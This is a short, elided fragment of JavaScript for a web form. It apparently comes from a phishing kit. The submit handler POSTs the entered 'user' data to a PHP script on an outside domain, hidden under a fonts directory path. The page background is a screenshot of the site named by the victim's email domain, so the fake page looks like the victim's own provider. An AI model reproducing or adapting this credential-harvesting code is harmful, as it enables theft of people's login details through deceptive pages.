...
const Default = ()=>{
    ...
    const submitDefaultForm = (e)=>{
        ...
        $.ajax({
            type: "POST",
            url: "https://dozenpearl.com/nc_assets/fonts/recov/doz.php",
            // dozenpearl.com
            data: user,
            success(data) {
                // alert('OK');
    ...
    style={{
        ...
        // https://image.thum.io/get/auth/70498-value/https://www.wikipedia.org/
        backgroundImage: `url(https://image.thum.io/get/auth/70498-value/https://www.${extracetdEmail}/)`,
        width:'100vw',
        height:'100vh',
